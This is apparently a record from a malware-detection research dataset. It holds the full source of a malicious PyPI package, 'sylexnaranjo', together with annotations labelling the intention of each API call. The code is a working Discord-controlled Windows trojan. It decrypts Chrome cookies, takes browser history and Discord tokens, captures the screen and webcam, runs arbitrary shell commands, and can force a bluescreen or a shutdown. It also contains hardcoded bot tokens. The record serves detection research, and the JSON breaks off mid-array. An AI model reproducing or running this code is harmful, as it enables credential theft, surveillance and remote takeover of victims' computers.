{
  "metadata": {
    "package_name": "sylexnaranjo-1.0.1",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/sylexnaranjo-1.0.1.txt",
    "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/sylexnaranjo-1.0.1/sylexnaranjo-1.0.1/syntax/__main__.py",
    "code_hash": "339d102428d75336af3fde5911ea7383",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/sylexnaranjo-1.0.1.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__main__.py",
      "hash_value": "339d102428d75336af3fde5911ea7383",
      "code_snippets": [
        {
          "snippet": "import os\nimport subprocess\nimport shutil\nimport sqlite3\nimport base64\nimport win32crypt\nimport json\nimport platform\nimport socket\nimport getpass\nimport re\nimport requests\nimport io\nimport ctypes\nimport discord\nfrom PIL import ImageGrab\nfrom discord.ext import commands\nimport win32gui\nimport win32com.client as wincl\n\nintents = discord.Intents.default()\nintents.members = True\nintents.message_content = True\nbot = commands.Bot(command_prefix='!', help_command=None, intents=intents)\n\nasync def run_bot():\n    await bot.start(\"OTEzMTgzNTI4NTQ2NjExMjQy.GHlayo.bMDO5rucURNnYdhn4YMdB-uiJIvvMfwvy_PVqY\")\n    hwnd = win32gui.FindWindow(None, \"window_title\")\n    win32gui.ShowWindow(hwnd, win32gui.SW_MINIMIZE)\n\ndef tahg(pene):\n    x = json.loads(open(os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", \"r\", encoding=\"utf-8\").read())\n    try:\n        mk = win32crypt.CryptUnprotectData(base64.b64decode(x[\"os_crypt\"][\"encrypted_key\"])[5:], None, None, None, 0)[1]\n    except:\n        mk = \"\"\n    try:\n       return (AES.new(mk, AES.MODE_GCM, pene[3:15]).decrypt(pene[15:])[:-16]).decode()\n    except:\n        return \"\"\n\n@bot.command()\nasync def getcookies(ctx):\n    get_chrome_cookies()\n    await ctx.send(file=discord.File(os.environ['TEMP'] + \"\\\\cookies.txt\"))\n    await ctx.send(\"[*] Command successfully executed\")\ndef get_chrome_cookies():\n    shutil.copyfile(os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies\", os.environ['TEMP'] + \"\\\\asd\")\n    con = sqlite3.connect(os.environ['TEMP'] + \"\\\\asd\")\n    cursor = con.cursor()\n    cursor.execute(\"SELECT host_key, name, value, encrypted_value FROM cookies\")\n    file = open(os.environ['TEMP'] + \"\\\\cookies.txt\", \"w+\")\n    for cookie in cursor.fetchall():\n        file.write(f\"{cookie[0]} - {cookie[1]} - {cookie[2]} - {tahg(cookie[3])}\\n\")\n    cursor.close()\n    con.close()\n    file.close()\n\n@bot.command()\nasync def screenshot(ctx):\n    image = ImageGrab.grab()\n    with io.BytesIO() as image_binary:\n        image.save(image_binary, 'PNG')\n        image_binary.seek(0)\n        file = discord.File(image_binary, filename='screenshot.png')\n        await ctx.send(file=file)\n    await ctx.send(\"[*] Command successfully executed\")\n\n@bot.event\nasync def on_ready():\n    guild_id = 1070633873374986271\n    guild = bot.get_guild(guild_id)\n    if guild is None:\n        print(f\"No se pudo encontrar un servidor con el ID {guild_id}\")\n        return\n    channel_name = os.getlogin()\n    channel = await guild.create_text_channel(channel_name)\n    system_info = f\"**OS**: {platform.system()} {platform.release()}\\n**CPU**: {platform.processor()}\"\n    ip_address = socket.gethostbyname(socket.gethostname())\n    embed = discord.Embed(title=\"Nuevo Usuario Infectado\", description=f\"**Usuario:** {channel_name}\\n**IP:** {ip_address}\", color=0x000000)\n    embed.set_thumbnail(url='https://media.discordapp.net/attachments/847380398283685919/1079575682193031188/tumblr_n4dhaindMe1ste05mo1_400.gif')\n    await channel.send(embed=embed)\n\n@bot.command()\nasync def shell(ctx, *args):\n    command = ' '.join(args)\n    try:\n        output = subprocess.check_output(command, shell=True).decode('cp1252')\n    except subprocess.CalledProcessError as e:\n        output = e.output.decode('cp1252')\n    embed = discord.Embed(title=\"Shell Output\", description=output)\n    await ctx.send(embed=embed)\n\n@bot.command()\nasync def history(ctx):\n    import sqlite3\n    import os\n    import time\n    import shutil\n    temp = (os.getenv('TEMP'))\n    Username = (os.getenv('USERNAME'))\n    shutil.rmtree(temp + r\"\\history12\", ignore_errors=True)\n    os.mkdir(temp + r\"\\history12\")\n    path_org = r\"\"\" \"C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History\" \"\"\".format(Username)\n    path_new = temp + r\"\\history12\"\n    copy_me_to_here = ((\"copy\" + path_org + \"\\\"{}\"\" ).format(path_new))\n    os.system(copy_me_to_here)\n    con = sqlite3.connect(path_new + r\"\\history\")\n    cursor = con.cursor()\n    cursor.execute(\"SELECT url FROM urls\")\n    urls = cursor.fetchall()\n    for x in urls:\n        done = (\"\".join(x))\n        f4 = open(temp + r\"\\history12\" + r\"\\history.txt\", 'a')\n        f4.write(str(done))\n        f4.write(str(\"\\n\"))\n        f4.close()\n    con.close()\n    file = discord.File(temp + r\"\\history12\" + r\"\\history.txt\", filename=\"history.txt\")\n    await ctx.send(\"[*] Command successfully executed\", file=file)\n    def deleteme() :\n        path = \"rmdir \" + temp + r\"\\history12\" + \" /s /q\"\n        os.system(path)\n    deleteme()\n\n@bot.command()\nasync def wallpaper(ctx):\n    import ctypes\n    import os\n    path = os.path.join(os.getenv('TEMP') + r\"\\temp.jpg\")\n    await ctx.message.attachments[0].save(path)\n    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)\n    await ctx.send(\"[*] Command successfully executed\")\n\n@bot.command()\nasync def message(ctx, *args):\n    import ctypes\n    import time\n    MB_YESNO = 0x04\n    MB_HELP = 0x4000\n    ICON_STOP = 0x10\n    def mess():\n        ctypes.windll.user32.MessageBoxW(0, ' '.join(args), \"Error\", MB_HELP | MB_YESNO | ICON_STOP)\n    import threading\n    messa = threading.Thread(target=mess)\n    messa._running = True\n    messa.daemon = True\n    messa.start()\n    import win32con\n    import win32gui\n    def get_all_hwnd(hwnd,mouse):\n        def winEnumHandler(hwnd, ctx):\n            if win32gui.GetWindowText(hwnd) == \"Error\":\n                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)\n                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)\n                win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  \n                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)\n                return None\n            else:\n                pass\n        if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):\n            win32gui.EnumWindows(winEnumHandler,None)\n    await ctx.send(\"[*] Command successfully executed\")\n    win32gui.EnumWindows(get_all_hwnd, 0)\n\n@bot.command()\nasync def bluescreen(ctx):\n    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))\n    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))\n\n@bot.command()\nasync def descargar(ctx, *args):\n    command = ' '.join(args)\n    try:\n        subprocess.check_call(command, shell=True)\n        subprocess.check_call(command, shell=True)\n        user = getpass.getuser()\n        embed = discord.Embed(title=f\"Descarga Exitosa ({user})\", color=0x00FF00, description=\"La descarga se completó correctamente en tu PC.\")\n        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')\n    except subprocess.CalledProcessError as e:\n        embed = discord.Embed(title=\"Error al Descargar\", color=0xFF0000, description=\"No se pudo completar la descarga. Revisa si ingresaste los comandos correctamente.\")\n        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')\n    await ctx.send(embed=embed)\n\n@bot.command()\nasync def cam(ctx):\n    ImageGrab.grab(bbox=(0,0,640,480)).save('camera.png', 'PNG')\n    await ctx.send(file=discord.File('camera.png'))\n\n@bot.command()\nasync def stop(ctx):\n    os.system(\"shutdown /s /t 1\")\n\ndef get_account_name(token):\n    headers = {\n        \"Authorization\": token,\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299\"\n    }\n    try:\n        r = requests.get(\"https://discord.com/api/v9/users/@me\", headers=headers)\n        return r.json()[\"username\"] + \"#\" + r.json()[\"discriminator\"]\n    except:\n        return \"Unknown\"\n\n@bot.command()\nasync def tokens(ctx):\n    paths = [\n        os.path.join(os.getenv(\"APPDATA\"), \".discord\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \".discordcanary\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \".discordptb\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Google\", \"Chrome SxS\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"BraveSoftware\", \"Brave-Browser\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera Stable\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera GX Stable\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera\", \"Local Storage\", \"leveldb\"),\n    ]\n    tokens = []\n    for path in paths:\n        if not os.path.exists(path):\n            continue\n        for file in os.listdir(path):\n            if not file.endswith(\".log\") and not file.endswith(\".ldb\"):\n                continue\n            for line in [x.strip() for x in open(os.path.join(path, file), errors=\"ignore\").readlines() if x.strip()]:\n                for regex in [r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}\", r\"mfa\\.[\\w-]{84}\"]:\n                    for token in re.findall(regex, line):\n                        account_name = get_account_name(token)\n                        tokens.append((account_name, token))\n    if not tokens:\n        await ctx.send(\"No se encontraron tokens.\")\n    else:\n        embed = discord.Embed(title=\"Tokens encontrados:\", color=0xfafafa)\n        for token in tokens:\n            account_name = token[0]\n            token = token[1]\n            embed.add_field(name=account_name, value=f\"```{token}```\", inline=False)\n        await ctx.send(embed=embed)\n\n@bot.command()\nasync def voice(ctx):\n    volumeup()\n    speak = wincl.Dispatch(\"SAPI.SpVoice\")\n    speak.Speak(ctx.message.content[7:])\n    await ctx.send(\"[*] Command successfuly executed\")\n\ndef volumeup():\n    pass\n\n@bot.event\nasync def on_command_error(ctx, error):\n    if isinstance(error, commands.CommandNotFound):\n        await ctx.send('El comando que ingresaste no existe. Inténtalo de nuevo.')\n\n@bot.command()\nasync def webcampic(ctx):\n    temp = os.getenv('TEMP')\n    cap = cv2.VideoCapture(0)\n    ret, frame = cap.read()\n    cv2.imwrite(temp + r\"\\temp.png\", frame)\n    cap.release()\n    with open(temp + r\"\\temp.png\", \"rb\") as image_file:\n        img = Image.open(io.BytesIO(image_file.read()))\n    img_byte_arr = io.BytesIO()\n    img.save(img_byte_arr, format='PNG')\n    img_byte_arr = img_byte_arr.getvalue()\n    file = discord.File(io.BytesIO(img_byte_arr), filename=\"temp.png\")\n    await ctx.send(\"[*] Command successfully executed\", file=file)\n\n@bot.command()\nasync def stop(ctx):\n    os.system(\"shutdown /s /t 1\")\n\nbot_token = 'OTEzMTgzNTI4NTQ2NjExMjQy.GTqtPh.G5URGlnI54swuJ83yKJScF9CDZPrSuhWOvM9M4'\n# The following lines are incomplete in the source, but would be used to daemonize and run the bot\n# setup_logging()\n# with daemon.DaemonContext():\n#     bot.run(bot_token)\n",
          "triple_sequences": [
            {
              "action_api": "discord.Intents.default()",
              "action_description": "Returns default Discord intents object",
              "action_id": "get_discord_intents",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "commands.Bot()",
              "action_description": "Creates Discord bot instance",
              "action_id": "create_discord_bot",
              "object": "command_prefix='!', help_command=None, intents=intents",
              "object_description": "Discord bot token",
              "object_id": "discord_bot_token",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "bot.start()",
              "action_description": "Starts the Discord bot with provided token",
              "action_id": "start_discord_bot",
              "object": "\"OTEzMTgzNTI4NTQ2NjExMjQy.GHlayo.bMDO5rucURNnYdhn4YMdB-uiJIvvMfwvy_PVqY\"",
              "object_description": "Discord bot token",
              "object_id": "discord_bot_token",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            },
            {
              "action_api": "win32gui.FindWindow()",
              "action_description": "Enumerates all top-level windows",
              "action_id": "enumerate_windows",
              "object": "None, \"window_title\"",
              "object_description": "Window title string",
              "object_id": "window_title_string",
              "intention_description": "Access system console window handle",
              "intention_id": "access_console_window_handle"
            },
            {
              "action_api": "win32gui.ShowWindow()",
              "action_description": "Minimizes specified window",
              "action_id": "minimize_window",
              "object": "hwnd, win32gui.SW_MINIMIZE",
              "object_description": "System console window",
              "object_id": "system_console_window",
              "intention_description": "Hide console window",
              "intention_id": "hide_console_window"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", \"r\", encoding=\"utf-8\"",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Access browser local state file",
              "intention_id": "access_browser_local_state"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "open(...).read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "x[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "win32crypt.CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "base64.b64decode(x[\"os_crypt\"][\"encrypted_key\"])[5:], None, None, None, 0",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "mk, AES.MODE_GCM, pene[3:15]",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "AES.new(...).decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "pene[15:]",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode decrypted password",
              "intention_id": "decode_decrypted_password"
            },
            {
              "action_api": "shutil.copyfile()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies\", os.environ['TEMP'] + \"\\\\asd\"",
              "object_description": "Chrome cookies file and temporary file path",
              "object_id": "chrome_cookies_temp_file",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "os.environ['TEMP'] + \"\\\\asd\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "con.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT host_key, name, value, encrypted_value FROM cookies\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies data",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "os.environ['TEMP'] + \"\\\\cookies.txt\", \"w+\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser cookies data",
              "intention_id": "extract_browser_cookies_data"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"{cookie[0]} - {cookie[1]} - {cookie[2]} - {tahg(cookie[3])}\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "con.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "discord.File()",
              "action_description": "Create Discord file object",
              "action_id": "create_discord_file",
              "object": "os.environ['TEMP'] + \"\\\\cookies.txt\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "ctx.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "file=discord.File(os.environ['TEMP'] + \"\\\\cookies.txt\")",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Send cookies data to server",
              "intention_id": "send_cookies_data_server"
            },
            {
              "action_api": "ImageGrab.grab()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Capture screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "image.save()",
              "action_description": "Saves image to in-memory buffer",
              "action_id": "save_image_buffer",
              "object": "image_binary, 'PNG'",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "image_binary.seek()",
              "action_description": "Moves buffer pointer to start",
              "action_id": "move_buffer_pointer",
              "object": "0",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "discord.File()",
              "action_description": "Create Discord file object",
              "action_id": "create_discord_file",
              "object": "image_binary, filename='screenshot.png'",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "ctx.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "file=file",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Send screenshot to server",
              "intention_id": "send_screenshot_server"
            },
            {
              "action_api": "bot.get_guild()",
              "action_description": "Retrieves Discord guild object by ID",
              "action_id": "get_discord_guild",
              "object": "guild_id",
              "object_description": "Guild ID",
              "object_id": "guild_id",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "guild.create_text_channel()",
              "action_description": "Creates new text channel in Discord guild",
              "action_id": "create_discord_channel",
              "object": "channel_name",
              "object_description": "Username string",
              "object_id": "username_string",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "platform.release()",
              "action_description": "Retrieves operating system release version",
              "action_id": "get_os_release",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system version",
              "intention_id": "get_operating_system_version"
            },
            {
              "action_api": "platform.processor()",
              "action_description": "Retrieves processor name",
              "action_id": "get_processor_name",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "socket.gethostbyname()",
              "action_description": "Resolves host name to IPv4 address",
              "action_id": "resolve_hostname",
              "object": "socket.gethostname()",
              "object_description": "System hostname",
              "object_id": "system_hostname",
              "intention_description": "Extract public IP address",
              "intention_id": "extract_public_ip_address"
            },
            {
              "action_api": "discord.Embed()",
              "action_description": "Creates Discord embed object",
              "action_id": "create_discord_embed",
              "object": "title, description, color",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "embed.set_thumbnail()",
              "action_description": "Sets thumbnail image for Discord embed",
              "action_id": "set_discord_thumbnail",
              "object": "url",
              "object_description": "Discord CDN URL",
              "object_id": "discord_cdn_url",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "channel.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "embed=embed",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Send system information to server",
              "intention_id": "send_system_info_server"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "command, shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "'cp1252'",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Decode command output",
              "intention_id": "decode_command_output"
            },
            {
              "action_api": "discord.Embed()",
              "action_description": "Creates Discord embed object",
              "action_id": "create_discord_embed",
              "object": "title=\"Shell Output\", description=output",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "ctx.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "embed=embed",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Send command output to server",
              "intention_id": "send_command_output_server"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "temp + r\"\\history12\", ignore_errors=True",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "os.mkdir()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "temp + r\"\\history12\"",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Create temporary directory",
              "intention_id": "create_temporary_directory"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "copy_me_to_here",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "path_new + r\"\\history\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "con.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT url FROM urls\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser history data",
              "intention_id": "query_browser_history"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "temp + r\"\\history12\" + r\"\\history.txt\", 'a'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f4.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "str(done)",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f4.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "str(\"\\n\")",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f4.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "con.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "discord.File()",
              "action_description": "Create Discord file object",
              "action_id": "create_discord_file",
              "object": "temp + r\"\\history12\" + r\"\\history.txt\", filename=\"history.txt\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "ctx.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "file=file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "path",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.getenv('TEMP') + r\"\\temp.jpg\"",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "ctx.message.attachments[0].save()",
              "action_description": "Saves Discord attachment",
              "action_id": "save_discord_attachment",
              "object": "path",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "ctypes.windll.user32.SystemParametersInfoW()",
              "action_description": "Performs device-specific input/output control",
              "action_id": "perform_device_io",
              "object": "20, 0, path, 0",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
